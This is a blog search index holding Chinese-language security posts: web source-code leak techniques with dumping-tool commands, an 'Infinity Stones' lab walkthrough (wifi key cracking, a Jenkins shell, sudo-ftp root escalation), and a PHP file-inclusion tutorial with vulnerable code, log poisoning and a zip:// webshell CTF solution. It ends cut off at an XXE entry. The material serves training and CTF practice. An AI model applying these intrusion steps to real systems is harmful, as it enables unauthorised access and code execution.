<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>常见Web源码泄露</title>
    <url>/2020/03/05/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<p><strong>常见的Web源码泄露：</strong></p>
<ul>
<li><p><strong>git</strong>源码泄露</p>
</li>
<li><p><strong>GitHub</strong>源码泄露</p>
</li>
<li><p><strong>svn</strong>源码泄露</p>
</li>
<li><p><strong>HG</strong>源码泄露</p>
</li>
<li><p><strong>CVS</strong>泄露</p>
</li>
<li><p><strong>WEB-INF/web.xml</strong>泄露</p>
</li>
<li><p><strong>SWP</strong>文件泄露</p>
</li>
<li><p><strong>Bzr</strong>泄露</p>
</li>
<li><p><strong>备份文件</strong></p>
<ul>
<li>网站源码</li>
<li><strong>bak</strong>文件</li>
<li><strong>vim</strong>缓存</li>
<li><strong>.DS_Store</strong></li>
</ul>
</li>
</ul>
<h3 id="1-git源码泄露"><a href="#1-git源码泄露" class="headerlink" title="1.git源码泄露"></a>1.git源码泄露</h3><p><strong>Git</strong>是一个开源的分布式版本控制系统，在执行<strong>git init</strong>初始化目录的时候，会在当前目录下自动创建一个<strong>.git</strong>目录，用来记录代码的变更记录等。发布代码的时候，如果没有把<strong>.git</strong>这个目录删除，直接发布到服务器上，攻击者就可以通过它来恢复源代码。</p>
<ul>
<li><p><strong>相关代码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span>         查看历史纪录</span><br><span class="line">git reset       切换版本</span><br><span class="line">get diff        对比版本异同</span><br><span class="line">git stash       储藏可工作目录的中间状态保存到一个未完结变更的堆栈中</span><br><span class="line">git stash list  查看现有stash</span><br><span class="line">git stash pop   恢复之前缓存的工作目录</span><br><span class="line">git stash drop  移除stash</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>漏洞利用工具</strong></p>
<p><a href="https://github.com/BugScanTeam/GitHack" target="_blank" rel="noopener">GitHack(python2)</a></p>
<p><a href="https://github.com/WangYihang/GitHacker" target="_blank" rel="noopener">GitHacker(python3)</a></p>
</li>
</ul>
<h3 id="2-GitHub源码泄露"><a href="#2-GitHub源码泄露" class="headerlink" title="2.GitHub源码泄露"></a>2.GitHub源码泄露</h3><p>GitHub是一个面向开源及私有软件项目的托管平台，很多网站将代码上传到平台托管。攻击者通过关键词搜索，可能会造成敏感信息的泄露，甚至可以下载网站源码。</p>
<h3 id="3-SVN源码泄露"><a href="#3-SVN源码泄露" class="headerlink" title="3.SVN源码泄露"></a>3.SVN源码泄露</h3><p><strong>SVN</strong>是一个开放源码的版本控制系统。在使用<strong>SVN</strong>管理本地代码的过程中，会自动生成一个名为<strong>.svn</strong>的隐藏文件夹，其中包含重要的源代码信息。若在发布代码时没有使用<strong>导出</strong>功能，而是直接复制代码文件夹到<strong>WEB服务器</strong>，会导致<strong>.SVN</strong>隐藏文件夹被暴露于外网环境，可以利用.<strong>.svn/entries</strong>文件获取到服务器源码。</p>
<ul>
<li><p><strong>漏洞利用工具</strong></p>
<p><a href="https://github.com/Mktubu/Tools" target="_blank" rel="noopener">Seay SVN漏洞利用工具</a></p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p>
</li>
<li><p>使用方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./rip-svn.pl -u http://xxxx.xxx/.svn/</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p><strong>修复建议</strong></p>
<p>删除<strong>web</strong>目录中所有.<strong>svn</strong>隐藏文件夹，开发人员使用<strong>SVN</strong>功能时，使用导出功能，进制复制代码。</p>
</li>
</ul>
<h3 id="4-HG源码泄露"><a href="#4-HG源码泄露" class="headerlink" title="4.HG源码泄露"></a>4.HG源码泄露</h3><p>当开发人员使用 <strong>Mercurial</strong> 进行版本控制，对站点自动部署。如果配置不当,可能会将.<strong>hg</strong> 文件夹直接部署到线上环境。这就引起了<strong>HG</strong>泄露漏洞。</p>
<ul>
<li><p><strong>漏洞利用工具</strong></p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p>
</li>
<li><p><strong>使用方法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./rip-svn.pl -v -u http://xxxx.xxx/.hg/</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h3 id="CVS泄露"><a href="#CVS泄露" class="headerlink" title="CVS泄露"></a>CVS泄露</h3><p><strong>CVS</strong>是一个<strong>C/S</strong>系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对<strong>CVS/Root</strong>以及<strong>CVS/Entries</strong>目录，直接就可以看到泄露的信息。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://xxx/CVS/Root      返回根信息</span><br><span class="line">http://xxx/CVS/Entries   返回所有文件结构</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>漏洞利用工具</strong></p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p>
</li>
<li><p><strong>使用方法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rip-cvs.pl -v -u http://www.xxx.com/CVS/</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><p><strong>WEB-INF</strong>是<strong>Java</strong>的<strong>Web</strong>应用的安全目录，必须通过<strong>web.xml</strong>文件对要访问的文件进行相应映射才能在页面中直接访问其中的文件。</p>
<ul>
<li><p><strong>WEB-INF目录：</strong></p>
<ul>
<li><strong>WEB-INF/web.xml</strong><br>web应用程序配置文件，描述了<strong>servlet</strong>和其他的应用组件配置及命名规则。</li>
<li><strong>WEB-INF/classes</strong><br>包含了站点所有用的<strong>.class</strong>文件，包括<strong>servlet class</strong>和非<strong>servlet class</strong></li>
<li><strong>WEB-INF/lib</strong><br>存放web应用需要的JAR文件</li>
<li><strong>WEB-INF/src</strong><br>源码目录,包括<strong>.asp</strong>和<strong>.php</strong>等</li>
<li><strong>WEB-INF/database.properties</strong><br>数据库配置文件</li>
<li><strong>WEB-INF/tags</strong><br>存放了自定义标签文件</li>
<li><strong>WEB-INF/jsp</strong><br><strong>jsp 1.2</strong> 以下版本的文件存放位置。</li>
<li><strong>WEB-INF/jsp2</strong><br>存放<strong>jsp2.0</strong>以下版本的文件。</li>
<li><strong>META-INF</strong><br>相当于一个信息包。</li>
</ul>
</li>
<li><p><strong>漏洞利用</strong></p>
<p>通过找到<strong>web.xml</strong>文件，推断<strong>class</strong>文件的路径，找到<strong>class</strong>文件，再通过反编译<strong>class</strong>文件，得到网站的源码。</p>
</li>
</ul>
<h3 id="SWP文件泄露"><a href="#SWP文件泄露" class="headerlink" title="SWP文件泄露"></a>SWP文件泄露</h3><p><strong>swp</strong>文件即<strong>swap</strong>文件，在编辑文件时产生的临时文件，为隐藏文件，如果文件未正常退出，该临时文件就会自动保存，文件名为<strong>.xxx.swp</strong></p>
<ul>
<li><p><strong>利用方法：</strong></p>
<p><strong>vim</strong>打开，打开命令：<code>vim -r index.php.swp</code></p>
</li>
</ul>
<h3 id="Bzr泄露"><a href="#Bzr泄露" class="headerlink" title="Bzr泄露"></a>Bzr泄露</h3><p><strong>bzr/Bazaar</strong>是个版本控制工具，支持多平台。</p>
<ul>
<li><p><strong>漏洞利用工具</strong></p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p>
</li>
<li><p><strong>使用方法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://xxx/.bzr/</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h3 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h3><ul>
<li><p>网站源码</p>
<p>网站的源码经常备份且放在<strong>Web</strong>目录下，攻击者通过才接文件路径，下载备份文件，导致源代码泄露。</p>
<ul>
<li>常见的备份文件后缀<ul>
<li><strong>.rar</strong></li>
<li><strong>.zip</strong></li>
<li><strong>.7z</strong></li>
<li><strong>.tar.gz</strong></li>
<li><strong>.bak</strong></li>
<li><strong>.txt</strong></li>
<li><strong>.old</strong></li>
<li><strong>.temp</strong></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>bak</strong>文件</p>
</li>
<li><p><strong>vim</strong>缓存</p>
</li>
<li><p><strong>.DS_Store</strong></p>
</li>
</ul>
<p>可以使用后台扫描工具进行扫描，<strong>御剑，dirsearch</strong>等</p>
<p><strong>.DS_Store</strong>利用工具<a href="https://github.com/gehaxelt/Python-dsstore" target="_blank" rel="noopener">Python .DS_Store parser</a></p>
]]></content>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>Infinity Stones</title>
    <url>/2020/02/23/HA_Infinity/</url>
    <content><![CDATA[<p><strong>HA：Infinity Stones 靶机测试</strong></p>
<ul>
<li><p><strong>Description：</strong></p>
<p>灭霸认为，如果他杀死了宇宙中所有生命的一半，他将恢复平衡。为此，他需要所有六块无限宝石来驱动无限手套，这反过来又使他能够弯曲时间，空间，能量以及物理和现实定律。但是这次复仇者联盟比灭霸领先一步。复仇者联盟在这个CTF中隐藏了所有无限石。帮助复仇者联盟获得所有无限石并恢复宇宙的平衡。<br><img src="/images/HA/infinity.jpg" alt="infinity"></p>
<a id="more"></a>
<p>该机器包含6种带有6种不同标志的无限石来测试您的技能。</p>
<ul>
<li>空间宝石 <strong>Space Stone</strong></li>
<li>心灵宝石 <strong>Mind Stone</strong></li>
<li>现实宝石 <strong>Reality Stone</strong></li>
<li>时间宝石 <strong>Time Stone</strong></li>
<li>力量宝石 <strong>Power Stone</strong></li>
<li>灵魂宝石 <strong>Soul Stone</strong></li>
</ul>
<p>可以用不同的方式找到每块石头。</p>
</li>
<li><p><strong>使用netdiscover发现目标IP<img src="/images/HA/1.png" alt="1"></strong></p>
</li>
<li><p><strong>nmap扫描端口：</strong><img src="/images/HA/2.png" alt="2"></p>
<ul>
<li><p>扫描结果为三个端口，首先查看<strong>80</strong>端口<img src="/images/HA/3.png" alt="3">)似乎并没有什么发现，使用<strong>dirb</strong>扫描目录<img src="/images/HA/4.png" alt="4">)但是只有<strong>/img</strong>和<strong>/wifi</strong>为重要目录。在<strong>/img</strong>藏着一张宇宙魔方的图片<img src="/images/HA/5.png" alt="5">我们知道空间宝石在宇宙魔方的内部，所以判断该图片有隐藏的信息，使用<strong>exiftool</strong>查看图像隐藏的数据</p>
<p><img src="/images/HA/6.png" alt="6">找到隐藏在图片中的空间宝石</p>
</li>
<li><p>然后我们在<strong>443</strong>端口上发现了一个<strong>https</strong>的<strong>web</strong>页面，因为<strong>SSL证书</strong>具有不安全的地方在证书处找到了第二块宝石，此处比较简单。<img src="/images/HA/10.png" alt="10"></p>
</li>
<li><p>接下来访问<strong>8080端口</strong>的内容<img src="/images/HA/11.png" alt="11">发现是一个Jenkins框架的Web页面，由于我们没有其他信息，无法得到用户名和密码所以暂且放到一边</p>
</li>
<li><p>最后在<strong>/wifi</strong>目录下发现了重要内容<img src="/images/HA/7.png" alt="7">)发现了一个<strong>cap</strong>文件和一个<strong>pwd.txt</strong>提示<img src="/images/HA/8.png" alt="8"></p>
</li>
</ul>
<blockquote>
<p>您的密码是thanos女儿的名字“ gam”（注意全为小写）加上以下内容<br>我对您强制执行新密码要求… 12个字符</p>
<p>一位大写字符<br>两个数字<br>两个小写</p>
<p>复仇者联盟第一次在电影院上映的日期</p>
</blockquote>
<p>  这里我们可以使用<strong>crunch</strong>来创建密码字典 <a href="https://www.cnblogs.com/wpjamer/p/9913380.html" target="_blank" rel="noopener">（crunch使用说明）</a></p>
<p>  <img src="/images/HA/9.png" alt="9"></p>
<p>  然后使用我们创建的字典和<strong>wifi</strong>数据包来找到密钥，这里使用<strong>aircrack-ng</strong>工具</p>
<p>  <img src="/images/HA/12.png" alt="12"></p>
<p>  找到<strong>wifi</strong>为<code>gamA00fe2012</code>，尝试使用该密钥作为目录并且找到了一个<strong>realsstone.txt</strong>，即找到了现实宝石。<img src="/images/HA/14.png" alt="14"></p>
<ul>
<li>然后我们再次回到最初的<strong>Web</strong>页面，在左上角有一个重定向链接<img src="/images/HA/13.png" alt="13">)这是一个有关于复仇者的测验（你能对几个呢？）完成测验后发现答案是一个二进制值<code>01101001</code><img src="/images/HA/15.png" alt="15"></li>
</ul>
<p>继续上边用过的套路，将该二进制值作为目录访问，得到了一个提示<strong>hints.txt</strong><img src="/images/HA/16.png" alt="16"></p>
<p>找到了一堆经过<strong>Brainfuck</strong>加密的密文，经过解密后可以得到一对用户名和密码<img src="/images/HA/17.png" alt="17"></p>
<ul>
<li>接下来就可以在<strong>8080</strong>端口的页面使用该用户名登录了<img src="/images/HA/18.png" alt="18"></li>
</ul>
</li>
</ul>
<ul>
<li><p><strong>利用Jenkins框架漏洞</strong></p>
<p><img src="/images/HA/19.png" alt="19">在设置完成后会得到一个会话，在获取<strong>shell</strong>会无法正确打开，所以需要使用<strong>python</strong>来尝试反弹<strong>shell</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>尝试查找SUID位的文件  <a href="https://www.cnblogs.com/fhefh/archive/2011/09/20/2182155.html" target="_blank" rel="noopener">（关于SUID）</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/images/HA/20.png" alt="20"></p>
<p>枚举出来的文件中发现了<strong>/opt/script/</strong>目录，在该目录发现了另一块宝石</p>
<p><img src="/images/HA/21.png" alt="21"></p>
</li>
<li><p><strong>进一步探索/opt</strong><img src="/images/HA/22.png" alt="22"><br>推测<strong>morag.kdbx</strong>比较重要，在复仇者系列中有一颗名为<strong>Morag</strong>的星球，即为星爵初次登场夺取“宇宙灵球（力量宝石）”的地方，而<strong>kdbx</strong>后缀提醒我们这个可能是个密钥数据库。</p>
<p>使用<strong>john</strong>来破解该<br><strong>hash</strong><img src="/images/HA/24.png" alt="24">)使用<strong>keepass</strong>打开<strong>morag.kdbx</strong>可以找到力量宝石<img src="/images/HA/25.png" alt="25"></p>
</li>
</ul>
<ul>
<li><p>在<strong>Creds</strong>中发现了一个<strong>base64</strong>字符串<img src="/images/HA/26.png" alt="26"></p>
<p>解码后得到一组用户名和密码<img src="/images/HA/27.png" alt="27"></p>
<p>推测可能为<strong>22</strong>端口的登陆凭据</p>
</li>
<li><p>使用<strong>ssh</strong>连接<img src="/images/HA/28.png" alt="28"></p>
</li>
</ul>
<ul>
<li><p><strong>提权</strong></p>
<p>使用命令<code>sudo -l</code>查看哪个用户没有密码，结果为<strong>/usr/bin/stp</strong><img src="/images/HA/29.png" alt="29">因此我们使用以下命令将用户切换到<strong>ftp</strong>且进一步得到<strong>root</strong>权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ftp</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>

<p>权限提升后得到灵魂宝石，集齐宝石。只要轻轻一个响指，就可以在宇宙中实现完美的平衡！！！</p>
<p><img src="/images/HA/30.png" alt="30"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>靶机测试</tag>
      </tags>
  </entry>
  <entry>
    <title>zip协议包含文件</title>
    <url>/2019/09/17/zip%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p><strong>文件包含（通过zip/phar协议包含文件）</strong></p>
<ul>
<li><strong>文件上传漏洞</strong></li>
</ul>
<p>产生原因：</p>
<p>通过引入文件时用户可控，没有严格的检验或是被绕过，操作一些敏感文件，导致文件泄露和恶意代码注入。</p>
<p>漏洞代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[page])) &#123;</span><br><span class="line"><span class="keyword">include</span> $_GET[page];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"home.PHP"</span>;</span><br><span class="line">&#125;</span><br><span class="line">其中$_GET[page]使用户可以控制变量。如果没有严格的过滤就导致漏洞的出现</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p><strong>包含文件的函数：</strong></p>
<p>1.include() 当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行。</p>
<p>2.require() 只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行。</p>
<p>3.include_once()</p>
<p>4.require_once()</p>
<p>require一般是用于文件头包含类文件、数据库等等文件,include一般是用于包含html模版文件<br>include_once()、require_once()与(include\require)的功能相同,只区别于当重复调用的时候，它只会调用一次。</p>
<ul>
<li><strong>本地文件包含利用</strong></li>
</ul>
<p>利用步骤：</p>
<ol>
<li>上传图片getshell</li>
<li>读取（php）文件</li>
<li>包含日志文件获取webshell</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.首先找到文件存放位置</span><br><span class="line">有权限读取apache配置文件或是&#x2F;etc&#x2F;init.d&#x2F;httpd</span><br><span class="line">默认位置&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log</span><br><span class="line"></span><br><span class="line">2.让日志文件插入php代码</span><br><span class="line">发送url请求时后插入php代码，一般使用burp抓包修改</span><br><span class="line">curl发包</span><br><span class="line">插入到get请求，或是user-agent部分</span><br><span class="line"></span><br><span class="line">3.包含日志文件（必须要权限包含）</span><br></pre></td></tr></table></figure>

<p>phpinfo.php 可以包含临时文件（显示临时文件路径）写工具发包上传文件。查看返回信息路径。在使用include包含文件（速度要求快）</p>
<p>包含data//或是<a href="https://link.jianshu.com/?t=php://input" target="_blank" rel="noopener">php://input</a>协议（伪协议，需要allow_url_include=On）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>包含文件上传的图片</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[page]) &#123;</span><br><span class="line"><span class="keyword">include</span>($_GET[page]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"show.php"</span>;</span><br><span class="line">&#125; <span class="comment">//利用page=/uploads/xxx.jpg</span></span><br><span class="line">用户控制$_GET[page]里面内容 包含一个带有恶意代码的上传图片。getshell</span><br><span class="line">（其中要找到上传图片的绝得路径）</span><br><span class="line"><span class="number">2.</span>包含文件上传的第二种</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[page]) &#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./action/"</span>.$_GET[page]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"./action/show.php"</span>;</span><br><span class="line">&#125; <span class="comment">//利用page=../uploads/xxx.jpg 跳出当前目录</span></span><br><span class="line"><span class="number">3.</span>第三种包含上传</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[page]) &#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./action/"</span>.$_GET[page].<span class="string">".php"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"./action/show.php"</span>;</span><br><span class="line">&#125; <span class="comment">// 可以看出会在后面追加一个.php后缀 ../uploads/xxx.jpg%00截断后面的.php</span></span><br><span class="line">需要开启（magic_quotes_gpc=off，php小于<span class="number">5.3</span><span class="number">.4</span>）</span><br></pre></td></tr></table></figure>

<p>防御：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* PHP中使用open_basedir限制访问区域</span><br><span class="line">* 过滤.（点）&#x2F;（斜杠）\（反斜杠）</span><br><span class="line">* 禁止服务器远程文件包含。</span><br></pre></td></tr></table></figure>



<ul>
<li><strong>zip/phar协议包含文件</strong></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span>($file.<span class="string">".jpg"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这是一个文件包含，但是将传递的文件名后面强制加了一个<strong>.jpg</strong>后缀，导致无法任意文件包含。但是可以通过<strong>zip</strong>协议绕过。</p>
<p>该协议的官方描述:<code>http://php.net/manual/zh/wrappers.compression.php</code></p>
<p>有一段用法：<code>zip://archive.zip#dir/file.txt</code></p>
<p>新建一个test.jpg文件，将代码编辑进去</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>因为上边的代码只能包含jpg文件，然后将其压缩成<strong>zip</strong>文件，压缩的时候注意选择<strong>only store</strong>防止数据被压缩。为了上传成功，将该zip文件的后缀改为jpg，然后通过</p>
<p><code>http://example.com/include/include2.php?file=zip://test.zip%23test</code>getshell</p>
<p><strong>phar</strong>协议也可以做到类似的事情，参考<code>http://php.net/manual/zh/wrappers.phar.php</code></p>
<p>基本上和zip差不多，区别就是<code>phar://php.zip/php.jpg</code>中是用 / 来分隔而不是#</p>
<ul>
<li><strong>Guess</strong></li>
</ul>
<p><img src="/images%5Czip%E5%8D%8F%E8%AE%AE/1.jpg" alt="1"></p>
<p>该题考查文件上传漏洞，upload的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_error_message</span><span class="params">($message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">    &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_message</span><span class="params">($message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;div class=\"msg success\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">    &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</span><br><span class="line">        <span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</span><br><span class="line">        <span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</span><br><span class="line">        <span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</span><br><span class="line">        <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</span><br><span class="line">    $str = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</span><br><span class="line">        $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</span><br><span class="line">        $str .= $set[$ch];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$reg=<span class="string">'/gif|jpg|jpeg|png/'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    $seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">    mt_srand($seed);</span><br><span class="line">    $ss = mt_rand();</span><br><span class="line">    $hash = md5(session_id() . $ss);</span><br><span class="line">    setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        show_error_message(<span class="string">"Upload ERROR. Return Code: "</span></span><br><span class="line">                           . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"error"</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    $check2 = ((($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">        &amp;&amp; ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>));</span><br><span class="line">    $check3=!preg_match($reg,pathinfo(</span><br><span class="line">      $_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>], PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($check3) show_error_message(<span class="string">"Nope!"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($check2) &#123;</span><br><span class="line">        $filename = <span class="string">'./uP1O4Ds/'</span> . random_str() . <span class="string">'_'</span></span><br><span class="line">          . $_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'tmp_name'</span>],</span><br><span class="line">                               $filename)) &#123;</span><br><span class="line">            show_message(<span class="string">"Upload successfully. File type:"</span></span><br><span class="line">                         . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> show_error_message(<span class="string">"Something wrong with the upload..."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_error_message(<span class="string">"only allow gif/jpeg/png files smaller than 200kb!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以看见上传的文件被重命名了但是这个重命名规则我们知道了就可以暴力破解。首先新建一个文件shell.php内容是一句话木马，然后压缩成zip格式再把格式重命名为jpg。</p>
<p>上传文件之后，写脚本进行爆破，上传路径为<strong>uP1O4Ds</strong></p>
<p>得到之后就可以用<code>zip://shell.zip%23shell就可以访问你的</code>shell.php<code>里面的php内容，再拿到flag</code></p>
<p>总结：首先对于上传部分限制了后缀名为图片类型，并且对上传文件进行重命名基本不会出现什么问题。但是页面存在文件包含并且自动在文件后面添加.php也就是限制了文件包含后缀是php。2个条件得到你不能上传php也不能访问你自己上传的图片文件。</p>
<p>分开看没有问题，但是我们可以通过文件包含的方式读取任意文件而且可以通过zip伪协议来上传一个jpg的文件再把它当做php来执行getshell在找到目录下的flag值，这里我们上传的文件可以通过暴力破解的方式来获得，因为读取文件的时候知道了重命名方式。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ZIP协议</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE简介</title>
    <url>/2019/07/25/XXE_LAB/</url>
    <content><![CDATA[<ul>
<li><p><strong>XXE介绍：</strong></p>
